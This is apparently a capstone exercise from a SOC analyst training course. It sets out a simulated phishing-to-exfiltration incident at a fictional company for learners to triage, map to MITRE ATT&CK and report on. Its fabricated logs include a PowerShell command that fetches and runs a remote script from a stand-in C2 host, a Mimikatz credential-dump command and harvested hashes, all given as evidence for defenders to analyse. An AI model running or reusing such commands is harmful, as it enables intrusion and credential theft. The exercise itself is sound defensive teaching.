# Day#40- Capstone Challenge: Multi-Stage Incident Investigation

---

## 🎯 Objective

To demonstrate mastery of SOC analyst skills by investigating a complex, multi-stage cyber attack involving phishing, malware execution, credential theft, lateral movement, and data exfiltration. This capstone challenge integrates all concepts learned from Days 1-39.

---

## 🏆 Challenge Overview

**Scenario:** You are a SOC Analyst at TechCorp Industries. At 09:15 on Monday morning, your SIEM triggers multiple alerts. An incident is unfolding, and you must investigate, contain, and remediate the threat while documenting your findings.

**Duration:** 4-6 hours (can be completed over multiple sessions)

**Difficulty:** Advanced (integrates 40 days of training)

**Skills Required:**
- Log analysis (Windows, Linux, network)
- Packet analysis (Wireshark)
- Incident response methodology
- SIEM query construction (Splunk/Wazuh)
- Phishing analysis
- Threat intelligence enrichment
- MITRE ATT&CK mapping
- Incident reporting
- Active Directory security
- Automation (optional: Python scripts)

---

## 🎬 Incident Scenario

### **Initial Alert**

```
ALERT ID: INC0045678
TIME: 2024-12-30 09:15:00 UTC
SOURCE: Wazuh EDR
SEVERITY: High
ALERT: Suspicious PowerShell execution with encoded command
HOST: FINANCE-PC-15 (192.168.20.105)
USER: sarah.johnson
```

### **Your Mission**

As the on-duty L1 SOC Analyst, you must:

1. **Triage** the initial alert
2. **Investigate** to determine scope and impact
3. **Identify** the attack chain (initial access through exfiltration)
4. **Contain** the threat
5. **Document** findings in a formal incident report
6. **Provide** recommendations to prevent recurrence

---

## 📊 Available Data Sources

You have access to the following logs and systems:

### **1. Windows Event Logs (FINANCE-PC-15)**
- Security Event Log (Event IDs: 4624, 4625, 4688, 4672, 4698, 4104)
- PowerShell Operational Log
- Sysmon logs (if configured)

### **2. Email Gateway Logs**
- Email received by sarah.johnson at 08:45 UTC
- Sender: billing@payroll-services.com
- Subject: "December Payroll - Action Required"
- Attachment: Payroll_Dec2024.xlsm

### **3. Network Traffic (Firewall/IDS Logs)**
- Outbound connections from 192.168.20.105
- DNS queries
- Unusual traffic to external IPs

### **4. Domain Controller Logs**
- Authentication events
- Account creation/modification
- Kerberos events (4768, 4769)

### **5. File Server Logs (FILE-SERVER-01)**
- File access logs
- Unusual file operations

---

## 🔍 Investigation Timeline (Simulated Data)

### **Phase 1: Initial Access (08:45 - 09:00 UTC)**

**Email Analysis:**
```
From: "Payroll Department" <billing@payroll-services.com>
To: sarah.johnson@techcorp.com
Subject: December Payroll - Action Required
Attachment: Payroll_Dec2024.xlsm (SHA256: a1b2c3d4e5f6...)

Email Headers:
Return-Path: <bounce@phishing-infra.ru>
Received: from mail.phishing-infra.ru (phishing-infra.ru [185.220.101.45])

Authentication-Results:
    spf=fail
    dkim=none
    dmarc=fail (p=REJECT)

X-Originating-IP: 185.220.101.45
```

**User Action:**
- 08:47 UTC: Sarah opens email
- 08:50 UTC: Sarah downloads attachment
- 08:52 UTC: Sarah enables macros in Excel document

---

### **Phase 2: Execution (09:00 - 09:05 UTC)**

**PowerShell Logs (Event ID 4104):**
```
TimeCreated: 2024-12-30 09:00:15
Computer: FINANCE-PC-15
User: sarah.johnson
ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.com/stage2.ps1')

TimeCreated: 2024-12-30 09:00:30
ScriptBlockText: Invoke-Mimikatz -DumpCreds
```

**Process Creation (Event ID 4688):**
```
09:00:05 - EXCEL.EXE spawned powershell.exe
09:00:15 - powershell.exe spawned cmd.exe
09:00:30 - cmd.exe spawned net.exe (net user /domain)
```

**Network Connections:**
```
09:00:16 - Connection to 203.0.113.88:443 (HTTPS)
09:00:17 - DNS query for malicious-c2.com
09:00:18 - Connection established to malicious-c2.com (203.0.113.88)
```

---

### **Phase 3: Persistence (09:05 - 09:08 UTC)**

**Scheduled Task Created (Event ID 4698):**
```
TimeCreated: 2024-12-30 09:05:22
Task Name: \Microsoft\Windows\SystemMaintenance\WindowsUpdate
Task Command: C:\Users\sarah.johnson\AppData\Roaming\svchost.exe
Trigger: At log on
Creator: sarah.johnson
```

**Registry Modification:**
```
Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value: WindowsDefender
Data: C:\Users\sarah.johnson\AppData\Roaming\svchost.exe
```

---

### **Phase 4: Credential Access (09:08 - 09:10 UTC)**

**LSASS Memory Access:**
```
Process: powershell.exe
Target Process: lsass.exe
Access: PROCESS_VM_READ
```

**Credentials Harvested:**
```
Username: sarah.johnson
NTLM Hash: 8846F7EAEE8FB117AD06BDD830B7586C

Username: admin_james
NTLM Hash: E19CCF75EE54E06B06A5907AF13CEF42

Username: domain_admin
NTLM Hash: 32ED87BDB5FDC5E9CBA88547376818D4
```

---

### **Phase 5: Lateral Movement (09:10 - 09:30 UTC)**

**RDP Connection (Event ID 4624 on FILE-SERVER-01):**
```
TimeCreated: 2024-12-30 09:12:45
Logon Type: 10 (RemoteInteractive)
Account Name: admin_james
Source IP: 192.168.20.105
Target: FILE-SERVER-01 (192.168.20.50)
Authentication: NTLM (Pass-the-Hash)
```

**Account Creation on Domain (Event ID 4720):**
```
TimeCreated: 2024-12-30 09:15:00
New Account: BackupAdmin
Created By: domain_admin
```

**Group Modification (Event ID 4732):**
```
TimeCreated: 2024-12-30 09:15:30
Account: BackupAdmin
Added to Group: Domain Admins
Modified By: domain_admin
```

---

### **Phase 6: Collection & Exfiltration (09:30 - 10:00 UTC)**

**File Access Logs (FILE-SERVER-01):**
```
09:32:00 - User: admin_james accessed \\\FILE-SERVER-01\Finance\Q4_2024_Reports
09:35:00 - 157 files accessed (*.xlsx, *.pdf, *.docx)
09:40:00 - Archive created: financial_data.zip (2.3 GB)
```

**Network Traffic:**
```
09:45:00 - Large outbound transfer detected
Source: 192.168.20.50 (FILE-SERVER-01)
Destination: 198.51.100.45:443 (AWS S3 bucket - external)
Protocol: HTTPS
Bytes Transferred: 2.4 GB over 15 minutes
```

**DNS Exfiltration Indicators:**
```
09:50:00 - Unusual DNS queries detected
Pattern: [base64-encoded-data].exfil-domain.com
Volume: 450 queries in 5 minutes
Source: 192.168.20.50
```

---

## 🛠️ Your Tasks

### **Task 1: Triage & Initial Assessment (30 minutes)**

**Deliverables:**
1. **Severity Classification:** Critical / High / Medium / Low
2. **Incident Type:** (Malware, Phishing, Data Breach, Unauthorized Access, etc.)
3. **Affected Assets:** List all compromised systems and accounts
4. **Initial IOCs:** Extract all indicators (IPs, domains, hashes, accounts)
5. **Immediate Containment Actions:** What should be done RIGHT NOW?

---

### **Task 2: Deep Investigation (2-3 hours)**

**Deliverables:**

1. **Complete Attack Timeline:**
   - Map every event from initial phishing email to data exfiltration
   - Include timestamps, systems, users, and actions

2. **MITRE ATT&CK Mapping:**
   - Identify ALL tactics and techniques used
   - Create ATT&CK Navigator visualization (optional)

| Time (UTC) | Tactic | Technique ID | Technique Name | Evidence |
|------------|--------|--------------|----------------|----------|
| 08:45 | Initial Access | T1566.001 | Phishing: Spearphishing Attachment | Email with malicious Excel |
| 09:00 | Execution | T1204.002 | User Execution: Malicious File | User enabled macros |
| ... | ... | ... | ... | ... |

3. **Phishing Email Analysis:**
   - Complete header analysis
   - SPF/DKIM/DMARC validation
   - Attachment hash reputation (VirusTotal)
   - Originating IP geolocation and reputation

4. **Malware Analysis:**
   - What did the macro do?
   - What PowerShell commands were executed?
   - What persistence mechanisms were established?
   - What files were dropped?

5. **Credential Compromise Assessment:**
   - Which accounts were compromised?
   - What access level do they have?
   - Where else have these accounts been used?

6. **Lateral Movement Analysis:**
   - How did the attacker move from FINANCE-PC-15 to FILE-SERVER-01?
   - What technique was used? (RDP, PsExec, WMI, etc.)
   - What authentication method? (Pass-the-Hash, legitimate credentials?)

7. **Data Exfiltration Analysis:**
   - What data was accessed?
   - How much data was exfiltrated?
   - Where was it sent? (IP, domain, cloud service?)
   - What method? (HTTPS upload, DNS tunneling, email?)

8. **Threat Intelligence Enrichment:**
   - Check all IOCs against VirusTotal, AbuseIPDB
   - Research attacker infrastructure (WHOIS, passive DNS)
   - Identify potential threat actor group (if applicable)

---

### **Task 3: Containment & Remediation (30 minutes)**

**Deliverables:**

1. **Containment Actions Taken:**
   - [ ] Isolate compromised systems from network
   - [ ] Block malicious IPs/domains at firewall
   - [ ] Disable compromised accounts
   - [ ] Revoke access keys/tokens
   - [ ] Other: _________________

2. **Eradication Steps:**
   - [ ] Remove malware from infected systems
   - [ ] Delete persistence mechanisms (scheduled tasks, registry keys)
   - [ ] Remove unauthorized accounts (BackupAdmin)
   - [ ] Scan all systems for similar IOCs
   - [ ] Other: _________________

3. **Recovery Plan:**
   - [ ] Rebuild compromised systems from clean images
   - [ ] Reset passwords for all compromised accounts
   - [ ] Enable MFA for privileged accounts
   - [ ] Restore any corrupted/deleted files from backup
   - [ ] Other: _________________

---

### **Task 4: Incident Report (1-2 hours)**

**Deliverables:**

Using the template from Day 34, create a complete incident report including:

1. **Executive Summary** (2-3 sentences for C-suite)
2. **Incident Details Table** (Incident ID, severity, timeline, etc.)
3. **Affected Systems & Accounts**
4. **Complete IOC List** (formatted for import into TIP)
5. **Full Attack Timeline** with MITRE ATT&CK mapping
6. **Root Cause Analysis**
7. **Business Impact Assessment** (data loss, downtime, financial impact)
8. **Response Actions** (Containment, Eradication, Recovery)
9. **Lessons Learned** (What went well, what could improve)
10. **Recommendations** (Immediate, Short-term, Long-term)

---

### **Task 5: Detection Improvement (30 minutes)**

**Deliverables:**

1. **Detection Gaps Identified:**
   - What should have been detected earlier?
   - What alerts were missing?

2. **New Detection Rules (SIEM Queries):**
   - Write at least 3 Splunk/Wazuh queries to detect this attack earlier
   - Example: "Alert on Excel spawning PowerShell"
   - Example: "Alert on suspicious scheduled task creation"
   - Example: "Alert on Pass-the-Hash authentication"

3. **Alert Tuning Recommendations:**
   - What existing alerts need tuning?
   - How can false positive rates be reduced?

---

## 📸 Submission Requirements

Submit a complete incident investigation package including:

1. **Triage Summary** (1 page)
2. **Complete Investigation Report** (5-10 pages) following Day 34 template
3. **MITRE ATT&CK Mapping Table** (or Navigator screenshot)
4. **IOC List** (CSV or JSON format for import)
5. **Timeline Visualization** (table or graphic)
6. **Detection Rules** (at least 3 new SIEM queries)
7. **Lessons Learned Document**
8. **Executive Presentation** (5-7 slides summarizing for non-technical leadership)

**Optional Bonus:**
- Python script that automates IOC enrichment for all identified indicators
- Threat hunt query to find similar activity in your environment
- Purple team recommendations for testing these detections

---

## 🎓 Skills Demonstrated

By completing this capstone challenge, you demonstrate:

✅ **Log Analysis** - Windows, Linux, network logs (Days 1-5)
✅ **Packet Analysis** - Wireshark, network traffic (Days 6-10)
✅ **Incident Response** - NIST framework, containment (Days 11-15)
✅ **SIEM Proficiency** - Splunk/Wazuh queries (Days 16-20)
✅ **Phishing Analysis** - Email headers, attachment analysis (Days 21-22, 39)
✅ **Threat Intelligence** - IOC enrichment, attribution (Day 23)
✅ **Malware Analysis** - Static analysis, behavior (Day 24)
✅ **EDR Skills** - Wazuh, FIM, vulnerability detection (Days 26-30)
✅ **SOC Operations** - Ticketing, workflow, escalation (Day 31)
✅ **MITRE ATT&CK** - Mapping techniques, coverage (Day 32)
✅ **Threat Hunting** - Proactive investigation (Day 33)
✅ **Incident Reporting** - Professional documentation (Day 34)
✅ **AD Security** - Kerberos attacks, credential theft (Day 35)
✅ **Cloud Security** - (if AWS involved) CloudTrail (Day 36)
✅ **Alert Tuning** - Detection engineering (Day 37)
✅ **Automation** - Python scripts (Day 38)

---

## 💡 Hints & Tips

### **Investigation Tips:**
- 🔍 **Read logs bottom-to-top** for email headers, top-to-bottom for event logs
- 🕵️ **Follow the user** - Track sarah.johnson's activity across all systems
- 🔗 **Correlate timestamps** - Connect events across different log sources
- 📊 **Visualize the timeline** - Use a spreadsheet or timeline tool
- 🎯 **Focus on anomalies** - PowerShell from Excel, RDP at odd hours, large data transfers

### **Common Mistakes to Avoid:**
- ❌ **Don't skip the email analysis** - Initial access vector is critical
- ❌ **Don't ignore authentication logs** - Credential theft is key to lateral movement
- ❌ **Don't forget network traffic** - Exfiltration happens over the network
- ❌ **Don't rush** - Thorough investigation prevents missing critical evidence
- ❌ **Don't forget MITRE ATT&CK** - Standardized language is essential

### **Where to Start:**
1. ✅ **Start with the alert** - PowerShell execution on FINANCE-PC-15
2. ✅ **Work backwards** - What happened before? (email, file download)
3. ✅ **Work forwards** - What happened after? (persistence, lateral movement)
4. ✅ **Expand scope** - Check other systems for similar IOCs
5. ✅ **Document as you go** - Don't wait until the end to write the report

---

## 🏆 Grading Rubric (Self-Assessment)

| Category | Points | Criteria |
|----------|--------|----------|
| **Triage** | 10 | Correct severity, incident type, initial containment |
| **Timeline Accuracy** | 15 | Complete, accurate timeline with all phases |
| **MITRE ATT&CK Mapping** | 15 | All techniques correctly identified |
| **IOC Extraction** | 10 | All IPs, domains, hashes, accounts identified |
| **Root Cause Analysis** | 10 | Correct identification of how breach occurred |
| **Containment Plan** | 10 | Appropriate, effective containment measures |
| **Incident Report** | 15 | Professional, complete, follows template |
| **Detection Rules** | 10 | Functional SIEM queries that would detect attack |
| **Recommendations** | 10 | Actionable, prioritized, realistic |
| **Presentation** | 5 | Clear executive summary |
| **TOTAL** | 100 | |

**Scoring:**
- **90-100:** Expert SOC Analyst - Ready for L2 role
- **75-89:** Proficient SOC Analyst - Strong L1 skills
- **60-74:** Competent SOC Analyst - Needs more practice
- **Below 60:** Review course material and retry

---

## 🎉 Congratulations!

By completing this 40-day challenge, you have built a comprehensive foundation in:
- Security operations center (SOC) workflows
- Log and packet analysis
- Incident response and handling
- SIEM platform mastery
- Threat intelligence and hunting
- Detection engineering
- Professional documentation and communication

**You are now equipped to pursue a career as a SOC Analyst!**

### **Next Steps:**
- 🎯 **Apply for junior SOC analyst positions**
- 📜 **Pursue certifications:** CompTIA Security+, CySA+, GIAC GCIA, Splunk Core Certified User
- 🔬 **Continue practicing:** Try TryHackMe, HackTheBox, CyberDefenders challenges
- 🌐 **Join communities:** Reddit r/cybersecurity, SANS NewBies, local security meetups
- 📚 **Keep learning:** Purple teaming, advanced malware analysis, cloud security

---

**Thank you for completing the 30+10 Days SOC Challenge!**

*You are now part of the cybersecurity defense community. Good luck in your career!*
